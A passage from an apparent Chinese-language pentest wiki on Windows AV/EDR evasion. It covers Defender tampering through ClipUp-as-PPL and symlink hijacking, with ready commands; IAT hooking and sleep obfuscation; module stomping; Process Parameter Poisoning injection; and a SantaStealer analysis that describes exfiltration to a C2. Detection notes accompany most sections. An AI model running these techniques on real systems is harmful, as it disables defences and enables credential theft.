- 必须使用以下 flags 通过 CreateProcess 创建 process：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与 binary signer 匹配的兼容 protection level（例如，anti-malware signers 使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，Windows signers 使用 `PROTECTION_LEVEL_WINDOWS`）。错误的 levels 会导致 creation 失败。

另请参阅此处关于 PP/PPL 和 LSASS protection 的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper：CreateProcessAsPPL（选择 protection level 并将 arguments 转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行创建进程，并接受一个参数，将日志文件写入调用者指定的路径。
- 作为 PPL 进程启动时，文件写入会获得 PPL backing。
- ClipUp 无法解析包含空格的路径；请使用 8.3 短路径指向通常受保护的位置。

8.3 short path helpers
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中派生短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用 launcher（例如 CreateProcessAsPPL）通过 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数，强制在受保护的 AV 目录中创建文件（例如 Defender Platform）。如有需要，使用 8.3 短名称。
3) 如果目标二进制文件在 AV 运行时通常处于打开/锁定状态（例如 MsMpEng.exe），则通过安装一个能够可靠地更早运行的 auto-start service，在系统启动且 AV 启动之前安排写入。使用 Process Monitor（boot logging）验证启动顺序。
4) 重启后，PPL-backed 写入会在 AV 锁定其二进制文件之前执行，破坏目标文件并阻止其启动。

Example invocation（出于安全原因已隐藏/缩短路径）：
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项和限制
- 你无法控制 ClipUp 写入的内容，只能控制其放置位置；该原语适合用于破坏，而不是精确注入内容。
- 需要本地管理员/SYSTEM 权限才能安装/启动服务，并且需要重启窗口。
- 时序至关重要：目标文件不得处于打开状态；启动时执行可以避免文件锁。

检测
- 创建 `ClipUp.exe` 进程且使用异常参数，尤其是由非标准启动器作为父进程，并且发生在启动前后。
- 配置为自动启动可疑二进制文件的新服务，并且始终在 Defender/AV 之前启动。调查 Defender 启动失败之前发生的服务创建/修改。
- 对 Defender 二进制文件/Platform 目录进行文件完整性监控；关注由带有 protected-process 标志的进程意外创建/修改文件。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制文件异常使用 PPL 级别的情况。

缓解措施
- WDAC/Code Integrity：限制哪些已签名二进制文件可以作为 PPL 运行，以及允许哪些父进程启动它们；阻止在合法上下文之外调用 ClipUp。
- 服务规范：限制自动启动服务的创建/修改，并监控启动顺序操纵行为。
- 确保已启用 Defender tamper protection 和 early-launch protections；调查表明二进制文件损坏的启动错误。
- 如果与你的环境兼容，可以考虑在存放安全工具的卷上禁用 8.3 短名称生成（务必进行全面测试）。

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender 通过枚举以下目录下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它会选择字典序最高的子文件夹版本字符串（例如 `4.18.25070.5-0`），然后从该目录启动 Defender 服务进程（同时相应更新服务/注册表路径）。这种选择会信任目录项，包括目录 reparse points（symlinks）。管理员可以利用这一点将 Defender 重定向到攻击者可写入的路径，从而实现 DLL sideloading 或服务中断。<sup>[[21]](#references)[[22]](#references)</sup>

前置条件
- 本地管理员权限（需要在 Platform 文件夹下创建目录/symlinks）
- 能够重启系统或触发 Defender platform 重新选择（启动时重启服务）
- 仅需使用内置工具（mklink）

工作原理
- Defender 会阻止对其自身文件夹的写入，但其平台选择会信任目录项，并选择字典序最高的版本，而不会验证目标是否解析到受保护/可信路径。

分步操作（示例）
1) 准备当前 platform 文件夹的一个可写副本，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 中创建一个指向你的文件夹的更高版本目录符号链接：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发器选择（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 从重定向后的路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应观察 `C:\TMP\AV\` 下的新 process path，以及反映该位置的 service configuration/registry。

Post-exploitation options
- DLL sideloading/code execution：将 DLL 放入或替换为 Defender 从其 application directory 加载的 DLL，以便在 Defender 的 processes 中执行 code。请参阅上面的章节：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial：删除 version-symlink，这样下次启动时 configured path 将无法解析，导致 Defender 启动失败：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意，此 technique 本身不会提供 privilege escalation；它需要 admin rights。

## API/IAT Hooking + Call-Stack Spoofing with PIC（Crystal Kit 风格）

Red teams 可以通过 hooking 目标 module 的 Import Address Table（IAT），并将选定的 API 路由到 attacker-controlled、position-independent code（PIC）中，将 runtime evasion 从 C2 implant 移入目标 module 本身。这会将 evasion 扩展到许多 kits 所暴露的小型 API surface 之外（例如 CreateProcessA），并将相同的 protections 扩展到 BOFs 和 post-exploitation DLLs。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高层方法
- 使用 reflective loader 将 PIC blob 与目标 module 一起 stage（prepend 或 companion）。PIC 必须 self-contained 且 position-independent。
- 当 host DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR，并将目标 imports（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）的 IAT entries patch 为指向 thin PIC wrappers。
- 每个 PIC wrapper 在 tail-calling real API address 之前执行 evasions。典型 evasions 包括：
- 在 call 前后进行 memory mask/unmask（例如 encrypt beacon regions、RWX→RX、修改 page names/permissions），然后在 call 后恢复。
- Call-stack spoofing：构造一个 benign stack，并 transition 到 target API，使 call-stack analysis 解析出预期的 frames。<sup>[[9]](#references)</sup>
- 为了兼容性，export 一个 interface，使 Aggressor script（或 equivalent）可以为 Beacon、BOFs 和 post-ex DLLs 注册要 hook 的 APIs。

为什么在这里使用 IAT hooking
- 适用于任何使用被 hooked import 的 code，无需修改 tool code，也不依赖 Beacon 代理特定 APIs。
- 覆盖 post-ex DLLs：hooking LoadLibrary* 可以拦截 module loads（例如 System.Management.Automation.dll、clr.dll），并对其 API calls 应用相同的 masking/stack evasion。
- 通过 wrapping CreateProcessA/W，恢复针对基于 call-stack 的 detections 可靠使用 process-spawning post-ex commands 的能力。

最小 IAT hook sketch（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- 在 relocations/ASLR 完成后、首次使用该 import 之前应用补丁。像 TitanLdr/AceLdr 这样的 reflective loaders 展示了如何在已加载模块的 DllMain 期间执行 hooking。
- 保持 wrappers 简短且 PIC-safe；通过打补丁前捕获的原始 IAT 值，或通过 LdrGetProcedureAddress，解析真实 API。
- 对 PIC 使用 RW → RX 转换，并避免留下可写且可执行的页面。

Call-stack spoofing stub
- Draugr-style PIC stubs 构造伪造的 call chain（将返回地址指向 benign modules），然后 pivot 到真实 API。
- 这可以绕过那些预期 Beacon/BOFs 到敏感 API 之间具有 canonical stacks 的检测。
- 配合 stack cutting/stack stitching 技术使用，使执行在 API prologue 之前落入预期的 frames。

Operational integration
- 将 reflective loader 放在 post-ex DLLs 的前部，使 PIC 和 hooks 在 DLL 加载时自动初始化。
- 使用 Aggressor script 注册目标 APIs，使 Beacon 和 BOFs 无需修改代码即可透明地受益于同一条 evasion path。

Detection/DFIR considerations
- IAT integrity：解析到 non-image（heap/anon）地址的 entries；定期验证 import pointers。
- Stack anomalies：不属于已加载 images 的返回地址；突然转移到 non-image PIC；不一致的 RtlUserThreadStart ancestry。
- Loader telemetry：进程内写入 IAT；早期 DllMain activity 修改 import thunks；加载时创建意外的 RX regions。
- Image-load evasion：如果 hooking LoadLibrary*，监控可疑的 automation/clr assemblies 加载，并检查其是否与 memory masking events 相关。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例如 Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

如果你控制一个 reflective loader，可以在 `ProcessImports()` 期间，通过将 loader 的 `GetProcAddress` pointer 替换为一个先检查 hooks 的 custom resolver 来 hook imports：<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 构建一个 **resident PICO**（persistent PIC object），使其在 transient loader PIC 释放自身后仍然存活。
- 导出一个 `setup_hooks()` function，用于覆盖 loader 的 import resolver（例如 `funcs.GetProcAddress = _GetProcAddress`）。
- 在 `_GetProcAddress` 中跳过 ordinal imports，并使用基于 hash 的 hook lookup，例如 `__resolve_hook(ror13hash(name))`。如果存在 hook，则返回它；否则委托给真实的 `GetProcAddress`。
- 在 link time 使用 Crystal Palace 的 `addhook "MODULE$Func" "hook"` entries 注册 hook targets。由于 hook 位于 resident PICO 内，它会保持有效。

这样即可实现 **import-time IAT redirection**，无需在加载 DLL 后 patch 其 code section。

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks 只有在目标函数实际存在于目标的 IAT 中时才会触发。如果模块通过 PEB-walk + hash 解析 APIs（没有 import entry），则强制加入一个 real import，使 loader 的 `ProcessImports()` path 能够看到它：

- 将 hashed export resolution（例如 `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）替换为类似 `&WaitForSingleObject` 的 direct reference。
- 编译器会生成一个 IAT entry，使 reflective loader 在解析 imports 时能够进行 interception。

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

不要 patch `Sleep`，而应 hook implant 实际使用的 **wait/IPC primitives**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）。对于长时间等待，将调用包装在 Ekko-style obfuscation chain 中，在 idle 期间加密内存中的 image：<sup>[[31]](#references)[[27]](#references)</sup>

- 使用 `CreateTimerQueueTimer` 调度一系列 callbacks，通过构造的 `CONTEXT` frames 调用 `NtContinue`。
- 典型 chain（x64）：将 image 设为 `PAGE_READWRITE` → 通过 `advapi32!SystemFunction032` 对完整 mapped image 执行 RC4 加密 → 执行 blocking wait → RC4 解密 → 通过遍历 PE sections **恢复各 section 的 permissions** → signal completion。
- `RtlCaptureContext` 提供一个 template `CONTEXT`；将其 clone 到多个 frames 中，并设置 registers（`Rip/Rcx/Rdx/R8/R9`）以调用每个步骤。

Operational detail：对于长时间等待返回“success”（例如 `WAIT_OBJECT_0`），这样 caller 会在 image 被 masked 时继续执行。该 pattern 可以在 idle windows 期间隐藏模块，避免经典的“patched `Sleep()`” signature。

Detection ideas (telemetry-based)
- 指向 `NtContinue` 的 `CreateTimerQueueTimer` callbacks 突发出现。
- `advapi32!SystemFunction032` 被用于大型连续的 image-sized buffers。
- 大范围 `VirtualProtect`，随后执行 custom per-section permission restoration。

### Runtime CFG registration for sleep-obfuscation gadgets

在启用 CFG 的 targets 上，首次间接跳转到诸如 `jmp [rbx]` 或 `jmp rdi` 这样的 mid-function gadget 通常会以 `STATUS_STACK_BUFFER_OVERRUN` 使进程崩溃，因为该 gadget 不存在于模块的 CFG metadata 中。为了使 Ekko/Kraken-style chains 在 hardened processes 内保持运行：<sup>[[30]](#references)</sup>

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 注册 chain 使用的每个 indirect destination，并提供 `CFG_CALL_TARGET_VALID` entries。
- 对于 loaded images（`ntdll`、`kernel32`、`advapi32`）内部的 addresses，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始，并覆盖完整的 image size。
- 对于 manually mapped/PIC/stomped regions，则使用 **allocation base** 和 allocation size。
- 不仅要标记 dispatch gadget，还要标记通过 indirect calls 到达的 exports（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscalls），以及任何将成为 indirect targets 的 attacker-controlled executable sections。

这样可以将 ROP/JOP-style sleep chains 从“仅在 non-CFG processes 中有效”转变为可复用于 `explorer.exe`、browsers、`svchost.exe` 以及其他使用 `/guard:cf` 编译的 endpoints 的 primitive。

### CET-safe stack spoofing for sleeping threads

完整的 `CONTEXT` replacement 噪声较大，并且在 CET Shadow Stack systems 上可能失败，因为 spoofed `Rip` 仍必须与 hardware shadow stack 一致。更安全的 sleep-masking pattern 是：<sup>[[30]](#references)</sup>

- 选择同一进程中的另一个 thread，并通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`、`StackLimit`）。
- 备份当前 thread 的真实 TEB/TIB。
- 使用 `GetThreadContext` 捕获真实的 sleeping context。
- **仅**将真实的 `Rip` 复制到 spoof context，保持 spoofed `Rsp`/stack state 不变。
- 在 sleep window 期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在合法的 stack range 内进行 unwind。
- wait 完成后，恢复原始 TIB 和 thread context。

这会保留与 CET 一致的 instruction pointer，同时误导那些依赖 TEB stack metadata 验证 unwinds 的 EDR stack walkers。

### APC-based alternative: Kraken Mask

如果 timer-queue dispatch 的 signature 过于明显，可以使用 queued APCs，从 suspended helper thread 执行相同的 sleep-encrypt-spoof-restore sequence：<sup>[[27]](#references)</sup>

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` 排队 prepared `CONTEXT` frames/APCs，并通过 `NtAlertResumeThread` drain 它们。
- 将 chain state 存储在 heap 中，而不是 helper stack 中，以避免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地 signal start event 并进入阻塞。
- 在恢复 TIB/context 前 suspend main thread（`NtSuspendThread` → restore → `NtResumeThread`），以缩小 scanner 捕获 half-restored stack 的 race window。

这会将 `CreateTimerQueueTimer` + `NtContinue` signature 替换为 helper-thread/APC signature，同时保留相同的 RC4 masking 和 stack-spoofing 目标。

Additional detection ideas
- 在 sleeps、waits 或 APC dispatch 前不久调用带有 `VmCfgCallTargetInformation` 的 `NtSetInformationVirtualMemory`。
- `GetThreadContext`/`SetThreadContext` 被包裹在 `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject` 或 `ConnectNamedPipe` 周围。
- `NtQueryInformationThread` 后紧接着直接写入当前 thread 的 TEB/TIB stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` chains 间接到达 `SystemFunction032`、`VirtualProtect` 或 section-permission restoration helpers。
- 在 signed modules 内部作为 dispatch pivots 反复使用短 gadget signatures，例如 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）。


## Precision Module Stomping

Module stomping 从目标进程中已经映射的 DLL 的 **`.text` section** 执行 payload，而不是分配明显的 private executable memory 或加载新的 sacrificial DLL。overwrite target 应当是一个**已加载且由磁盘支持的 image**，其 code space 能够容纳 payload，同时不会破坏进程仍需要的 code paths。<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

针对 `uxtheme.dll` 或 `comctl32.dll` 等 common modules 进行 naive stomping 很脆弱：DLL 可能未加载到 remote process 中，并且过小的 code region 会导致进程崩溃。更可靠的 workflow 是：

1. 枚举 target process 的 modules，并保留一个只包含名称的 include list，其中列出已加载的 DLLs。
2. 首先构建 payload，并记录其**精确 byte size**。
3. 扫描磁盘上的 candidate DLLs，并将 PE section **`.text` 的 `Misc_VirtualSize`** 与 payload size 进行比较。这一点比 file size 更重要，因为它反映了 executable section **映射到内存时**的大小。
4. 解析 **Export Address Table (EAT)**，并选择一个 exported function RVA 作为 stomp start offset。
5. 计算 **blast radius**：如果 payload 超出所选 function boundary，就会覆盖内存中位于其后的相邻 exports。

实际环境中常见的 recon/selection helpers：
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
操作注意事项
- 优先使用远程进程中**已经加载**的 DLL，以避免 `LoadLibrary`/unexpected image loads 产生的 telemetry。
- 优先选择目标应用很少执行的 exports，否则正常代码路径可能在线程创建之前或之后命中被 stomp 的字节。
- 较大的 implants 通常需要将 shellcode 的嵌入方式从字符串字面量改为**byte-array/braced initializer**，以确保整个 buffer 在 injector 源代码中得到正确表示。

检测思路
- 向 **image-backed executable pages**（`MEM_IMAGE`、`PAGE_EXECUTE*`）执行 remote writes，而不是写入更常见的 private RWX/RX allocations。
- 内存中的 export entry points 与磁盘上的 backing file 不再匹配。
- Remote threads 或 context pivots 在合法 DLL export 内开始执行，且其前几个字节最近被修改。
- 针对 DLL `.text` pages 执行可疑的 `VirtualProtect(Ex)` / `WriteProcessMemory` 序列，随后创建线程。

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) 是一种 **process-injection / EDR-evasion** 技术，可避免经典的 remote write 路径（`VirtualAllocEx` + `WriteProcessMemory`）。它并不将字节复制到已经运行的 target 中，而是利用 Windows 会将选定的 `CreateProcessW` 启动参数**复制到子进程中**这一事实，并将其存储在 `PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内。<sup>[[28]](#references)[[29]](#references)</sup>

### 可由 `CreateProcessW` 复制的 Poisonable carriers

有用的 carriers 包括：

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（使用 `CREATE_UNICODE_ENVIRONMENT`）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

实际 carrier 限制：

- 对于 `CreateProcessW`，`lpCommandLine` 必须指向**可写内存**，且上限为 **32,767 个 Unicode 字符**，包括 null terminator。
- `lpEnvironment` 必须是由连续 `NAME=VALUE\0` 字符串组成，并以额外的 `\0` 结尾的 Unicode environment block。
- `lpReserved` 在官方定义中为保留字段，因此应将 `ShellInfo` mapping 视为 implementation detail，而不是稳定且有文档保证的 contract。

这会将正常的进程创建转变为**payload-transfer primitive**。Operator 使用 attacker-controlled startup data 创建子进程，并让 Windows 执行跨进程复制。

### 不使用 remote write APIs 的 Remote lookup flow

子进程创建后，使用**只读** primitives 解析已复制的 buffer：

1. `NtQueryInformationProcess(ProcessBasicInformation)` → 获取 `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. 读取 remote `PEB`
3. 跟随 `PEB.ProcessParameters`
4. 读取 `RTL_USER_PROCESS_PARAMETERS`
5. 使用选定的 pointer：
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

最小流程：
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### 执行复制的参数缓冲区

复制的参数区域通常是 `RW`，不可执行。常见的 P3 chain 是：

1. 正常创建进程（不挂起）
2. 使用 `NtProtectVirtualMemory` / `VirtualProtectEx` 将选定的参数页面设为可执行
3. 复用 `PROCESS_INFORMATION` 中已返回的主线程句柄
4. 使用 `NtSetContextThread`（`CONTEXT_CONTROL`，覆盖 `RIP`）重定向执行

不同于经典的 thread hijacking workflow，这不需要 `SuspendThread` / `ResumeThread`；可以直接通过返回的主线程句柄修改 context。

这可以避开多个通常受监控的 injection API：

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 通常还包括 `SuspendThread` / `ResumeThread`

### Null-byte 限制与 staged shellcode

这三个 carrier 都是**字符串或类似字符串的数据**，因此包含 `0x00` 的 raw payload 会在传输过程中被截断。一个实用的 workaround 是使用**无 null 的 first stage**，在运行时重建 constants，然后加载任意 second stage。

一种简单模式是基于 XOR 的 constant synthesis：
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
这使第一阶段能够构造栈字符串、API 参数、DLL 路径或第二阶段 shellcode loader，而无需在传输的参数中嵌入 null bytes。

### 第一阶段基于栈的 API 调用

当第一阶段必须调用 `LoadLibraryA` 等 API 时，可以：

- 将字符串/缓冲区 push 到目标栈上
- 保留 **32-byte x64 shadow space**
- 将 `RCX`、`RDX`、`R8`、`R9` 设置为常量或相对于 `RSP` 的指针
- 在调用前保持 `RSP` **16-byte aligned**

随后，第二阶段可以从栈复制到 `PAGE_READWRITE` allocation 中，通过 `VirtualProtect` 将其切换为 `PAGE_EXECUTE_READ`，然后跳转执行，从而避免直接分配 RWX 内存。

### 检测思路

作者提到的良好 hunting 机会包括：

- `VirtualProtectEx` / `NtProtectVirtualMemory` 将 **process-parameter pages 设置为可执行**
- 该保护变更随后出现 `SetThreadContext` / `NtSetContextThread`
- 远程读取 `PEB`，随后读取 `RTL_USER_PROCESS_PARAMETERS`
- 创建进程期间，`lpCommandLine`、`lpEnvironment` 或 `STARTUPINFO.lpReserved` 的值异常地长或具有高 entropy

### 注意事项

- P3 是一种 **cross-process transfer trick**，本身不是完整的 execution primitive：复制的参数仍然需要执行权限变更以及 execution redirection 方法。
- 作者曾考虑 `RtlCreateProcessReflection` / Dirty Vanity，但最终放弃，因为它内部会调用 `NtWriteVirtualMemory` 和 `NtCreateThreadEx` 等可疑 primitives。

## SantaStealer 用于 Fileless Evasion 和 Credential Theft 的 Tradecraft

SantaStealer（又名 BluelineStealer）展示了现代 info-stealers 如何在单一 workflow 中结合 AV bypass、anti-analysis 和 credential access。<sup>[[24]](#references)</sup>

### Keyboard layout gating 与 sandbox delay

- 配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现 Cyrillic 布局，sample 会创建一个空的 `CIS` marker，并在运行 stealers 前终止，从而确保它不会在被排除的 locales 上 detonate，同时留下一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层的 `check_antivm` 逻辑

- Variant A 遍历进程列表，使用自定义滚动校验和对每个名称进行 hash，并将其与内置的 debugger/sandbox blocklist 进行比较；它还会对 computer name 重复执行校验和，并检查 `C:\analysis` 等工作目录。
- Variant B 检查系统属性（进程数量下限、最近的 uptime），调用 `OpenServiceA("VBoxGuest")` 来检测 VirtualBox additions，并围绕 sleep 执行 timing checks，以发现 single-stepping。任何命中都会在 modules 启动前终止执行。

### 无文件 helper + 双重 ChaCha20 reflective loading

- 主 DLL/EXE 内嵌一个 Chromium credential helper，该 helper 要么被写入磁盘，要么被手动映射到内存中；无文件模式会自行解析 imports/relocations，因此不会写入任何 helper artifacts。
- 该 helper 使用 ChaCha20 对第二阶段 DLL 进行两次加密（两个 32-byte keys + 12-byte nonces）。两次处理完成后，它会对 blob 执行 reflective loading（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的 exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。<sup>[[25]](#references)</sup>
- ChromElevator routines 使用 direct-syscall reflective process hollowing，将 payload 注入正在运行的 Chromium browser，继承 AppBound Encryption keys，并直接从 SQLite databases 解密 passwords/cookies/credit cards，尽管存在 ABE hardening。


### 模块化内存 collection 与分块 HTTP exfil

- `create_memory_based_log` 遍历全局 `memory_generators` function-pointer table，并为每个启用的 module（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个 thread。每个 thread 将结果写入 shared buffers，并在约 45 秒的 join window 后报告其 file count。
- 完成后，所有内容都会使用静态链接的 `miniz` library 压缩为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` sleep 15 秒，并通过 HTTP POST 将 archive 以 10 MB chunks 流式发送到 `http://<C2>:6767/upload`，伪装 browser 的 `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个 chunk 添加 `User-Agent: upload`、`auth: <build_id>`，以及可选的 `w: <campaign_tag>`；最后一个 chunk 追加 `complete: true`，以便 C2 知道 reassembly 已完成。

## References

- [1] [Advanced Evasion Tradecraft：Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – 博客](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks，不再为 malware 提供免费通行证](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – 文档](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – 示例](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – 示例](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer 的新 infection chain 与基于 ConfuserEx 的 obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 应该信任你的 zero trust 吗？绕过 Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 之前：探索 Storm-2603 之前的 ransomware operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：滥用 Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – 借助 Protected Process Light (PPL) 对抗 EDRs](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – 使用 Folder Redirect Technique 打破 Windows Defender 的 protective shell](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain：从 RAT 到 Builder 再到 Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer 即将来到小镇：一种新型且野心勃勃的 Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：通过 API Tracing 击败 Node.js Malware](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：使用 Crystal Palace 让 Adaptix 进入休眠](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
